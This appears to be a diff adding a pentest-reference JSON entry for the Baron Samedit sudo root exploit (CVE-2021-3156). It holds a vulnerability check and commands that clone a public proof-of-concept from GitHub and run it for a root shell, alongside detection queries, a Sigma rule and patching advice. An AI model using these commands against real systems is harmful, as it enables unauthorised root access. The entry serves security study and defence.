@@ -1,0 +1,97 @@
+{
+  "id": "linux-baron-samedit",
+  "name": "Baron Samedit (CVE-2021-3156) - Sudo Heap Overflow",
+  "command": "python3 exploit_nss.py",
+  "description": "Baron Samedit exploits a heap buffer overflow in sudo (versions 1.8.2 through 1.8.31p2 and 1.9.0 through 1.9.5p1) via sudoedit -s. It grants instant root without needing any credentials or sudo permissions. One of the most impactful Linux privesc CVEs - affects nearly every Linux distribution released before January 2021.",
+  "platform": "linux",
+  "type": "command",
+  "opsec": "loud",
+  "category": "Post-Exploitation",
+  "subcategory": "Privilege Escalation",
+  "certifications": [
+    "OSCP",
+    "CPTS"
+  ],
+  "primary_cert": "OSCP",
+  "source": "CVE-2021-3156; Qualys discovery",
+  "tags": [
+    "baron-samedit",
+    "cve-2021-3156",
+    "sudo",
+    "heap-overflow",
+    "linux-privesc",
+    "root"
+  ],
+  "mitre": [
+    "T1068"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== CHECK IF VULNERABLE ===\n  sudoedit -s /\n  # Vulnerable: starts with \"sudoedit:\" (error message)\n  # Patched: starts with \"usage:\" (normal usage message)\n  # Or check version:\n  sudo --version\n  # Vulnerable: 1.8.2 - 1.8.31p2, 1.9.0 - 1.9.5p1\n\n=== EXPLOIT (multiple variants) ===\n  # Python NSS variant (most reliable):\n  git clone https://github.com/worawit/CVE-2021-3156\n  cd CVE-2021-3156\n  python3 exploit_nss.py\n  # Root shell!\n\n  # C variant:\n  gcc exploit.c -o exploit\n  ./exploit\n\n=== AFFECTED DISTROS ===\n- Ubuntu 20.04 (Focal) - default install\n- Debian 10 (Buster)\n- CentOS 7/8\n- Fedora 33\n- Nearly all Linux distros pre-Jan 2021\n\n=== THE BUG ===\nsudoedit -s triggers a heap buffer overflow when processing\nbackslash-escaped characters. The overflow can overwrite\nservice_user struct to load attacker-controlled shared library.",
+  "examples": [
+    {
+      "label": "Check if vulnerable",
+      "command": "sudoedit -s / 2>&1 | head -1"
+    },
+    {
+      "label": "Python NSS exploit",
+      "command": "python3 exploit_nss.py"
+    },
+    {
+      "label": "Check sudo version",
+      "command": "sudo --version | head -1"
+    }
+  ],
+  "references": [
+    {
+      "title": "CVE-2021-3156 - Qualys Advisory",
+      "url": "https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt"
+    },
+    {
+      "title": "Exploit PoC",
+      "url": "https://github.com/worawit/CVE-2021-3156"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "linux-exploit-suggester",
+      "note": "LES identifies Baron Samedit among other privesc CVEs.",
+      "rel": "prereq"
+    },
+    {
+      "id": "linux-dirtycow",
+      "note": "Another major Linux kernel privesc for older systems.",
+      "rel": "alternative"
+    }
+  ],
+  "defense": {
+    "why_it_works": "A heap buffer overflow in sudoedit -s allows overwriting memory structures. By crafting specific environment variables and arguments, an attacker can redirect code execution to gain root privileges.",
+    "prerequisites": "Any local user account (no sudo permissions needed); vulnerable sudo version.",
+    "impact": "Instant root privilege escalation from any unprivileged user.",
+    "detection": "[MITRE T1068] sudoedit execution with -s flag; crash logs from sudo; unexpected root shell spawning.",
+    "artifacts": "Sudo segfault in system logs; sudoedit -s in bash history; core dumps from sudo process.",
+    "splunk_spl": "index=linux sourcetype=syslog (\"sudoedit\" AND \"segfault\") OR (\"sudo\" AND \"heap\" AND \"overflow\")\n| table _time, host, process, message",
+    "elastic_kql": "process.name:\"sudoedit\" OR (message:*sudoedit* AND message:*segfault*)",
+    "sentinel_kql": "Syslog\n| where SyslogMessage has \"sudoedit\" and (SyslogMessage has \"segfault\" or SyslogMessage has \"SIGABRT\")\n| project TimeGenerated, HostName, SyslogMessage",
+    "sigma_rules": "linux_sudo_cve_2021_3156_baron_samedit",
+    "prevention": "Update sudo to 1.8.32 or 1.9.5p2+; use sudo alternatives; monitor sudoedit usage; apply distro security patches promptly.",
+    "sources": [
+      "CVE-2021-3156",
+      "https://attack.mitre.org/techniques/T1068/"
+    ],
+    "detections": [
+      {
+        "platform": "sigma",
+        "name": "Baron Samedit (CVE-2021-3156) exploitation attempt",
+        "logic": "title: Baron Samedit Sudo Exploit Attempt\nstatus: experimental\nlogsource:\n  product: linux\n  service: syslog\ndetection:\n  selection:\n    message|contains:\n      - \"sudoedit\"\n      - \"segfault\"\n  condition: selection\nlevel: critical",
+        "data_source": "linux-syslog",
+        "attack": [
+          "T1068"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "high",
+        "false_positives": "Sudo crashes from other causes (very rare)",
+        "tuning": "Any sudoedit segfault should be investigated immediately"
+      }
+    ]
+  }
+}
